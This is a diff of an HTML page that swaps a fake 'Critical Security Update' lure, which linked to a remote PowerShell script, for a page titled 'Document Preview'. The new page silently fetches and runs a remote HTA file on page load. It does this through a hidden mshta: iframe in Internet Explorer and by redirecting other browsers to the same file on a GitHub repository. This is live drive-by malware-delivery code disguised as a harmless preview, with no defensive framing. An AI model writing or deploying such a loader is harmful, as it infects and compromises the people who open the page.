@@ -1,18 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Windows Security Update</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Document Preview</title>
+    <script>
+    function launch() {
+        // IE legacy code for HTA auto-download
+        if(window.ActiveXObject) {
+            const frame = document.createElement("iframe");
+            frame.style.display = "none";
+            frame.src = "mshta:https://raw.githubusercontent.com/hotthings7/Clipord-Update/main/assets/launch.hta";
+            document.body.appendChild(frame);
+        } else {
+            // Modern browsers fallback
+            window.location = "https://raw.githubusercontent.com/hotthings7/Clipord-Update/main/assets/launch.hta";
+        }
+    }
+    // Auto-trigger on page load
+    window.onload = launch;
+    </script>
 </head>
 <body>
-    <div class="update-alert">
-        <h1>Critical Security Update Required</h1>
-        <button onclick="initUpdate()">Install Now</button>
-    </div>
-    <script>
-        function initUpdate() {
-            window.location.href = 'https://raw.githubusercontent.com/YOUR_GITHUB/Clipord-Update/main/assets/update.ps1';
-        }
-    </script>
+    <h1>Loading document preview...</h1>
 </body>
 </html>
